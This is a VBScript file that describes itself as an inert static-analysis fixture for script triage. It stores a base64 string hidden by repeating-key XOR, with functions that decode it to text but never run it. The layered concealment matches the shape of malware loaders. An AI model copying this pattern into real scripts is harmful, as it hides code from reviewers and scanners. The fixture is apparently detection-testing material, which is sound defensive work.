Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_9f77feac = "/on9LoP80bwhzenXvSeZ+tGTIJXl27g33P/GpSaV19KlPpWk0KUhgOnArzqv+MajMZX7x+A6kebQozSW18evIJn4wLAzlOnEuDeCtfmfCr3EhuIKvcT8mAagpoLiYoz7wK01ldfXoyee/In4LpPp2bwzme/akzuUtdetP4Dp3as83ezQ/mqSvdepYZT0wb4+zeDAuCKDspvjNpS6jK5nk+2HqHyV8NWhIpztmqU8hunYpTbf7Ib6MJK41fR8lOnAsCeD7caTM5ft2rhvuP3auCCV+8eAM5Kn0KhgyOqBrzfD7MiqO5zt67wzhOCJj2is3cepIIPU5LkwnOHXkBqF5sC+N4P7+K0wrPvArTWVpdCoYMjqga83w+yaqDOE9MapNZn7wL4rr/jVuDrNwP+PB6zb26omh+nGqQ64/dq4IJX7x4AzktTwpSGA58etMJzt6Kg2wrDW+TGVu9CwPJXwwJMhhOnTqW+C7cejJ4Lr0eEhkeXEoDfe+Mf9"
Const Codec_9f77feac = "base64_chunks|repeating_key_xor|88,b4,cc,52,f0"

Function Base64_9f77feac(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_9f77feac", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_9f77feac = outputBytes
End Function

Function Load_9f77feac()
  Dim partWidth, packedText
  partWidth = (Len(Material_9f77feac) + 3) \ 4
  packedText = Mid(Material_9f77feac, 1, partWidth) & Mid(Material_9f77feac, partWidth + 1, partWidth) & Mid(Material_9f77feac, partWidth * 2 + 1, partWidth) & Mid(Material_9f77feac, partWidth * 3 + 1)
  Load_9f77feac = Base64_9f77feac(packedText)
End Function

Function Decode_9f77feac(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  keyBytes = Array(136,180,204,82,240)
  For i = 0 To UBound(s)
    result(i) = s(i) Xor keyBytes(i Mod 5)
  Next
  Decode_9f77feac = result
End Function

Function Recover_9f77feac()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = UBound(Array(3, 5, 8, 13))
      s = Load_9f77feac()
      For p = 0 To 0
        d = Decode_9f77feac(s)
      Next
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_9f77feac = t
End Function

Sub Copy_9f77feac(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_9f77feac()
  Dim resultText
  Call Copy_9f77feac(Recover_9f77feac(), resultText)
  Inspect_9f77feac = resultText
End Function
